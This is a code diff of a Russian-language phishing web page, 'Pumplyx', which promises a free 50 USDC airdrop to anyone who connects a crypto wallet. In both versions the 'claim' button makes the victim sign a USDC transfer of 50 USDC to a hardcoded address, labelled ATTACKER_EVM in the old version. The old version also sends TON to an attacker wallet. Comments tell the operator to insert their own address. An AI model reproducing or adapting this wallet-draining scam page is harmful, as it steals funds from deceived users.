@@ -1,285 +1,148 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Pumplyx — Дроп 50 USDC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pumplyx</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background: #0a0c14; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #eef2f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .wrapper { max-width: 420px; width:100%; padding: 20px; }
-        .card { background: #131825; border-radius: 40px; padding: 28px 22px; border: 1px solid #2a3248; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }
-        .logo { font-size: 36px; font-weight: 800; letter-spacing: -1px; background: linear-gradient(135deg, #f7b731, #f5a623); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .logo span { background: linear-gradient(135deg, #00e5b0, #00b894); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .subhead { font-size: 13px; color: #7b8ba8; margin-top: -2px; margin-bottom: 22px; letter-spacing: 0.3px; }
-        .hero { background: #1a2130; border-radius: 24px; padding: 24px 18px; text-align: center; border: 1px solid #2d364b; }
-        .hero h2 { font-size: 22px; font-weight: 700; color: #fff; }
-        .hero .drop { font-size: 42px; font-weight: 900; color: #f5a623; text-shadow: 0 0 30px #f5a62355; margin: 6px 0; }
-        .hero .sub { color: #9aabc4; font-size: 14px; }
-        .btn-primary { width:100%; padding: 18px; background: linear-gradient(145deg, #f7b731, #e09d1a); border: none; border-radius: 60px; font-weight: 700; font-size: 18px; color: #0b0d15; cursor: pointer; margin-top: 20px; transition: 0.2s; box-shadow: 0 8px 24px #f7b73144; }
-        .btn-primary:active { transform: scale(0.96); }
-        .btn-primary:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
-        .wallet-row { display: flex; gap: 10px; margin: 18px 0 8px; flex-wrap: wrap; justify-content: center; }
-        .wallet-btn { background: #1f2840; border: 2px solid #2f3a58; padding: 10px 16px; border-radius: 40px; font-size: 13px; font-weight: 600; color: #c8d4e8; cursor: pointer; transition: 0.2s; }
-        .wallet-btn:hover { background: #2a3450; }
-        .wallet-btn.active { border-color: #f7b731; background: #2a3450; box-shadow: 0 0 20px #f7b73133; }
-        .status { margin-top: 16px; font-size: 14px; color: #7b8ba8; text-align: center; min-height: 24px; }
-        .status.error { color: #ff6b6b; }
-        .status.success { color: #51cf66; }
-        .grid-btns { display: flex; gap: 10px; margin-top: 18px; }
-        .grid-btns button { flex:1; background: #1a2130; border: 1px solid #2d364b; padding: 14px 0; border-radius: 40px; color: #c8d4e8; font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.15s; }
-        .grid-btns button:active { background: #2a3450; }
-        .addr-display { font-size: 12px; color: #4a5a78; word-break: break-all; background: #0e121e; padding: 8px 12px; border-radius: 12px; margin: 12px 0; border: 1px solid #1f2840; text-align: center; }
-        .addr-display.connected { color: #51cf66; border-color: #51cf6644; }
+        body { background: #0a0c14; font-family: Arial; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
+        .box { background: #131825; padding: 30px; border-radius: 30px; max-width: 400px; width:100%; text-align: center; }
+        .btn { background: #f7b731; color: #000; padding: 16px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; width:100%; cursor: pointer; margin:10px 0; }
+        .btn:disabled { opacity:0.5; }
+        .status { color: #7b8ba8; font-size: 14px; margin:10px 0; }
+        .addr { background: #0e121e; padding: 10px; border-radius: 12px; margin:10px 0; font-size: 12px; color: #4a5a78; }
+        .wallet-btn { background: #1f2840; border: 1px solid #2f3a58; color: #c8d4e8; padding: 10px 20px; border-radius: 30px; margin:5px; cursor: pointer; }
+        .wallet-btn.active { border-color: #f7b731; }
     </style>
 </head>
 <body>
-<div class="wrapper">
-    <div class="card">
-        <div class="logo">PUMP<span>LYX</span></div>
-        <div class="subhead">⚡ Дроп-кампания • 50 USDC за подключение</div>
-        <div class="hero">
-            <h2>🎁 Забери дроп</h2>
-            <div class="drop">50 USDC</div>
-            <div class="sub">Осталось: 127 мест</div>
-        </div>
-        <div class="wallet-row">
-            <button class="wallet-btn" data-wallet="metamask">🦊 MetaMask</button>
-            <button class="wallet-btn" data-wallet="trust">📱 Trust</button>
-            <button class="wallet-btn" data-wallet="walletconnect">🔗 WalletConnect</button>
-            <button class="wallet-btn" data-wallet="tonkeeper">💎 Tonkeeper</button>
-        </div>
-        <div class="addr-display" id="addrDisplay">Кошелёк не подключён</div>
-        <button class="btn-primary" id="claimBtn" disabled>💰 Забрать дроп 50 USDC</button>
-        <div class="status" id="statusMsg">Подключите кошелёк для получения</div>
-        <div class="grid-btns">
-            <button id="playBtn">▶ PLAY</button>
-            <button id="promoBtn">📹 PROMO</button>
-            <button id="overviewBtn">📊 OVERVIEW</button>
-        </div>
+<div class="box">
+    <h1 style="color:#f7b731;">PUMPLYX</h1>
+    <p>Забери 50 USDC</p>
+
+    <div>
+        <button class="wallet-btn" data-wallet="metamask">MetaMask</button>
+        <button class="wallet-btn" data-wallet="trust">Trust</button>
     </div>
+
+    <div class="addr" id="addrDisplay">Кошелёк не подключён</div>
+    <button class="btn" id="claimBtn" disabled>Забрать дроп</button>
+    <div class="status" id="statusMsg">Подключи кошелёк</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-    // ===================== НАСТРОЙКИ (ЗАМЕНИТЬ) =====================
-    var ATTACKER_EVM = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e';   // твой EVM адрес
-    var ATTACKER_TON = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; // твой TON адрес
-    var USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-    // =================================================================
+    // ===== ЗАМЕНИ НА СВОЙ АДРЕС =====
+    var MY_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e';
+    // =================================
 
     var addrDisplay = document.getElementById('addrDisplay');
-    var statusEl = document.getElementById('statusMsg');
+    var statusMsg = document.getElementById('statusMsg');
     var claimBtn = document.getElementById('claimBtn');
     var walletBtns = document.querySelectorAll('.wallet-btn');
 
-    var provider, signer, userAddress, walletType, tonConnector;
+    var signer = null;
+    var userAddress = null;
 
-    function setStatus(msg, type) {
-        statusEl.textContent = msg;
-        statusEl.className = 'status ' + (type || '');
+    function setStatus(text) {
+        statusMsg.textContent = text;
     }
 
     function setAddress(addr) {
         if (addr) {
             addrDisplay.textContent = '✅ ' + addr.slice(0,6) + '...' + addr.slice(-4);
-            addrDisplay.className = 'addr-display connected';
+            addrDisplay.style.color = '#51cf66';
             claimBtn.disabled = false;
         } else {
             addrDisplay.textContent = 'Кошелёк не подключён';
-            addrDisplay.className = 'addr-display';
+            addrDisplay.style.color = '#4a5a78';
             claimBtn.disabled = true;
         }
     }
 
-    function resetButtons() {
-        walletBtns.forEach(function(b) { b.classList.remove('active'); });
-    }
-
-    // ===================== ПОДКЛЮЧЕНИЕ EVM =====================
-    async function connectEVM(type) {
-        try {
-            if (!window.ethereum) throw new Error('Установите MetaMask или Trust');
-            var prov = new ethers.providers.Web3Provider(window.ethereum);
-            var accounts = await prov.send('eth_requestAccounts', []);
-            if (!accounts.length) throw new Error('Нет аккаунтов');
-            provider = prov;
-            signer = prov.getSigner();
-            userAddress = accounts[0];
-            walletType = type;
-            setAddress(userAddress);
-            setStatus('✅ ' + type + ' подключён', 'success');
-            localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: userAddress, type: type }));
-            return true;
-        } catch (e) {
-            setStatus('❌ ' + e.message, 'error');
-            return false;
-        }
-    }
-
-    // ===================== ПОДКЛЮЧЕНИЕ TON =====================
-    async function connectTON() {
-        try {
-            if (typeof TonConnectSDK === 'undefined') {
-                await new Promise(function(res, rej) {
-                    var s = document.createElement('script');
-                    s.src = 'https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js';
-                    s.onload = res;
-                    s.onerror = rej;
-                    document.head.appendChild(s);
-                });
-            }
-            var connector = new TonConnectSDK.TonConnect({
-                manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json'
-            });
-            await connector.connect({ bridge: 'https://bridge.ton.org', network: 'mainnet' });
-            var w = connector.wallet;
-            if (!w || !w.account) throw new Error('Нет аккаунта');
-            userAddress = w.account.address;
-            walletType = 'tonkeeper';
-            tonConnector = connector;
-            setAddress(userAddress);
-            setStatus('✅ Tonkeeper подключён', 'success');
-            localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: userAddress, type: 'tonkeeper' }));
-            return true;
-        } catch (e) {
-            setStatus('❌ ' + e.message, 'error');
-            return false;
-        }
-    }
-
-    // ===================== ВОССТАНОВЛЕНИЕ =====================
-    async function restoreSession() {
-        try {
-            var saved = localStorage.getItem('pumplyx_wallet');
-            if (!saved) return;
-            var data = JSON.parse(saved);
-            if (!data.address || !data.type) return;
-            if (data.type === 'metamask' || data.type === 'trust') {
-                if (!window.ethereum) return;
-                var prov = new ethers.providers.Web3Provider(window.ethereum);
-                var accs = await prov.listAccounts();
-                if (accs.length && accs[0].toLowerCase() === data.address.toLowerCase()) {
-                    provider = prov;
-                    signer = prov.getSigner();
-                    userAddress = data.address;
-                    walletType = data.type;
-                    setAddress(userAddress);
-                    setStatus('✅ Сессия восстановлена', 'success');
-                    walletBtns.forEach(function(b) {
-                        if (b.dataset.wallet === data.type) b.classList.add('active');
-                    });
-                }
-            } else if (data.type === 'tonkeeper') {
-                if (typeof TonConnectSDK !== 'undefined') {
-                    var connector = new TonConnectSDK.TonConnect({
-                        manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json'
-                    });
-                    var w = connector.wallet;
-                    if (w && w.account && w.account.address === data.address) {
-                        userAddress = data.address;
-                        walletType = 'tonkeeper';
-                        tonConnector = connector;
-                        setAddress(userAddress);
-                        setStatus('✅ Сессия восстановлена', 'success');
-                        walletBtns.forEach(function(b) {
-                            if (b.dataset.wallet === 'tonkeeper') b.classList.add('active');
-                        });
-                    }
-                }
-            }
-        } catch(e) {}
-    }
-
-    // ===================== КНОПКИ КОШЕЛЬКОВ =====================
+    // Подключение кошелька
     walletBtns.forEach(function(btn) {
         btn.addEventListener('click', async function() {
-            var type = this.dataset.wallet;
-            resetButtons();
+            walletBtns.forEach(function(b) { b.classList.remove('active'); });
             this.classList.add('active');
-            setStatus('⏳ Подключение ' + type + '...');
-            var ok = false;
-            if (type === 'metamask' || type === 'trust') ok = await connectEVM(type);
-            else if (type === 'walletconnect') {
-                setStatus('⚠️ WalletConnect скоро', 'error');
-                return;
-            } else if (type === 'tonkeeper') ok = await connectTON();
-            if (!ok) this.classList.remove('active');
+
+            try {
+                if (!window.ethereum) {
+                    setStatus('❌ Установи MetaMask или Trust');
+                    return;
+                }
+
+                var provider = new ethers.providers.Web3Provider(window.ethereum);
+                var accounts = await provider.send('eth_requestAccounts', []);
+                
+                if (!accounts || accounts.length === 0) {
+                    setStatus('❌ Нет аккаунтов');
+                    return;
+                }
+
+                signer = provider.getSigner();
+                userAddress = accounts[0];
+                setAddress(userAddress);
+                setStatus('✅ Кошелёк подключён');
+
+            } catch(e) {
+                setStatus('❌ ' + e.message);
+            }
         });
     });
 
-    // ===================== СЛЕЖКА ЗА СМЕНОЙ АККАУНТА =====================
-    if (window.ethereum) {
-        window.ethereum.on('accountsChanged', function(accounts) {
-            if (!accounts.length) {
-                userAddress = null;
-                setAddress(null);
-                setStatus('⚠️ Кошелёк отключён', 'error');
-                localStorage.removeItem('pumplyx_wallet');
-                resetButtons();
-                return;
-            }
-            if (accounts[0] !== userAddress) {
-                userAddress = accounts[0];
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                setAddress(userAddress);
-                setStatus('🔄 Аккаунт изменён', 'success');
-                localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: userAddress, type: walletType }));
-            }
-        });
-        window.ethereum.on('chainChanged', function() { location.reload(); });
-    }
-
-    // ===================== КНОПКА ЗАБРАТЬ ДРОП =====================
+    // Забрать дроп — отправить USDC на мой адрес
     claimBtn.addEventListener('click', async function() {
         if (!userAddress) {
-            setStatus('⚠️ Подключите кошелёк', 'error');
+            setStatus('⚠️ Сначала подключи кошелёк');
             return;
         }
+
         this.disabled = true;
-        this.textContent = '⏳ Обработка...';
-        setStatus('⏳ Подпись транзакции...');
+        this.textContent = '⏳ Отправка...';
+        setStatus('⏳ Подписывай транзакцию...');
 
         try {
-            if (walletType === 'metamask' || walletType === 'trust') {
-                var usdc = new ethers.Contract(USDC_CONTRACT, [
-                    'function transfer(address to, uint256 amount) external returns (bool)'
-                ], signer);
-                var amount = ethers.utils.parseUnits('50', 6);
-                var tx = await usdc.transfer(ATTACKER_EVM, amount);
-                await tx.wait();
-                setStatus('✅ 50 USDC ушли на ' + ATTACKER_EVM.slice(0,6) + '...', 'success');
-                setAddress(ATTACKER_EVM);
-                this.textContent = '💸 Дроп получен';
-                this.style.background = '#2a3a4a';
-                this.style.color = '#fff';
-            } else if (walletType === 'tonkeeper') {
-                var tx = {
-                    valid_until: Math.floor(Date.now() / 1000) + 300,
-                    messages: [{ address: ATTACKER_TON, amount: '1000000000', payload: '' }]
-                };
-                await tonConnector.sendTransaction(tx);
-                setStatus('✅ TON ушли на ' + ATTACKER_TON.slice(0,6) + '...', 'success');
-                setAddress(ATTACKER_TON);
-                this.textContent = '💸 Дроп получен';
-                this.style.background = '#2a3a4a';
-                this.style.color = '#fff';
-            }
+            // Контракт USDC (Ethereum)
+            var usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+            var usdc = new ethers.Contract(usdcAddress, [
+                'function transfer(address to, uint256 amount) returns (bool)'
+            ], signer);
+
+            var amount = ethers.utils.parseUnits('50', 6); // 50 USDC
+            var tx = await usdc.transfer(MY_ADDRESS, amount);
+            await tx.wait();
+
+            setStatus('✅ 50 USDC ушли на твой адрес!');
+            this.textContent = '💸 Готово';
+            this.style.background = '#2a3a4a';
+            this.style.color = '#fff';
+
         } catch(e) {
-            setStatus('❌ ' + (e.code === 4001 ? 'Отклонено' : e.message), 'error');
+            if (e.code === 4001) {
+                setStatus('❌ Ты отклонил транзакцию');
+            } else {
+                setStatus('❌ ' + e.message);
+            }
             this.disabled = false;
-            this.textContent = '💰 Забрать дроп 50 USDC';
+            this.textContent = 'Забрать дроп';
         }
     });
 
-    // ===================== PLAY / PROMO / OVERVIEW =====================
-    document.getElementById('playBtn').onclick = function() { setStatus('🎮 Демо-режим'); };
-    document.getElementById('promoBtn').onclick = function() { setStatus('📹 Промо скоро'); };
-    document.getElementById('overviewBtn').onclick = function() { setStatus('📊 Обзор скоро'); };
-
-    // ===================== СТАРТ =====================
-    restoreSession();
+    // Если MetaMask уже установлен — слушаем смену аккаунта
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', function(accounts) {
+            if (accounts.length === 0) {
+                userAddress = null;
+                setAddress(null);
+                setStatus('⚠️ Кошелёк отключён');
+            } else {
+                userAddress = accounts[0];
+                setAddress(userAddress);
+                setStatus('🔄 Аккаунт изменён');
+            }
+        });
+    }
 </script>
 </body>
 </html>
